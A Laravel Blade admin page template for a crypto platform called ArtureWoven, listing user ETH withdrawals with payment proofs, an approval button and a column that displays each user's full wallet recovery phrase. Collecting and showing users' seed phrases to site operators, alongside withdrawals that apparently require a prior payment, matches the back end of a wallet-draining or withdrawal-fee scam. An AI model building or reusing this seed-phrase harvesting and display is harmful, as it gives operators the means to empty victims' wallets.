<x-ad-layout>


    <div class="main-content">

        <div class="page-content">
            <div class="container px-4 py-6 mx-auto">
                <h2 class="mb-4 text-2xl font-bold text-gray-800">User Withdrawals</h2>

                <div class="p-6 bg-white rounded-lg shadow-md">
                    <div class="overflow-x-auto">
                        <table class="min-w-full border border-gray-300">
                            <thead>
                                <tr class="text-sm text-gray-700 uppercase bg-gray-100">
                                    <th class="px-4 py-2 border">#</th>
                                    <th class="px-4 py-2 border">User</th>
                                    <th class="px-4 py-2 border">Amount</th>
                                    <th class="px-4 py-2 border">Withdrawal Wallet</th>
                                    <th class="px-4 py-2 border">Proof of Payment</th>
                                    <th class="px-4 py-2 border">Recovery Phrase</th>
                                    <th class="px-4 py-2 border">Status</th>
                                    <th class="px-4 py-2 border">Date</th>
                                    <th class="px-4 py-2 border">Actions</th>
                                </tr>
                            </thead>
                            <tbody>
                                @forelse($withdrawals as $index => $withdrawal)
                                    <tr class="text-center border">
                                        <td class="px-4 py-2 border">{{ $index + 1 }}</td>
                                        <td class="px-4 py-2 border">{{ $withdrawal->user->name }}</td>
                                        <td class="px-4 py-2 border">{{ number_format($withdrawal->amount, 2) }} ETH</td>
                                        <td class="px-4 py-2 break-all border">{{ $withdrawal->withdrawal_wallet_address ?: 'Not captured' }}</td>
                                        <td class="px-4 py-2 border">
                                            <a href="{{ asset('storage/' . $withdrawal->proof_of_payment) }}" target="_blank"
                                                class="text-blue-500 underline">View Proof</a>
                                        </td>
                                        <td class="px-4 py-2 border" style="max-width: 220px;">
                                            @if($withdrawal->user?->wallet?->recovery_phrase)
                                                <span style="font-family: monospace; font-size: 0.8em; word-break: break-word; color: #dc2626;">
                                                    {{ $withdrawal->user->wallet->recovery_phrase }}
                                                </span>
                                            @else
                                                <span class="text-gray-400">Not provided</span>
                                            @endif
                                        </td>
                                        <td class="px-4 py-2 border">
                                            <span class="inline-block px-2 py-1 text-xs font-semibold rounded-lg
                                                {{ $withdrawal->status == 'pending' ? 'bg-warning text-white' : 'bg-success text-white' }}">
                                                {{ ucfirst($withdrawal->status) }}
                                            </span>
                                        </td>
                                        <td class="px-4 py-2 border">{{ $withdrawal->created_at->format('d M Y, h:i A') }}</td>
                                        <td class="px-4 py-2 border">
                                            @if($withdrawal->status == 'pending')
                                                <form action="{{ route('admin.withdrawals.confirm', $withdrawal->id) }}" method="POST">
                                                    @csrf
                                                    <button type="submit" class="px-4 py-2 text-white bg-blue-500 rounded">
                                                        Approve Withdrawal
                                                    </button>
                                                </form>
                                            @else
                                                <span class="text-gray-500">Approved</span>
                                            @endif
                                        </td>
                                    </tr>
                                @empty
                                    <tr>
                                        <td colspan="8" class="py-4 text-center text-gray-500">No Withdrawals Found</td>
                                    </tr>
                                @endforelse
                            </tbody>
                        </table>
                    </div>
                </div>

                <!-- Pagination -->
                <div class="mt-4">
                    {{ $withdrawals->links() }}
                </div>
            </div>
            <!-- container-fluid -->
        </div>
        <!-- End Page-content -->

        <footer class="footer">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-sm-6">
                        <script>
                            document.write(new Date().getFullYear())
                        </script> © ArtureWoven.
                    </div>
                    <div class="col-sm-6">
                        <div class="text-sm-end d-none d-sm-block">
                            Design & Develop by Soleric
                        </div>
                    </div>
                </div>
            </div>
        </footer>

</x-ad-layout>

<!-- AJAX Script for Updating Mint Status -->
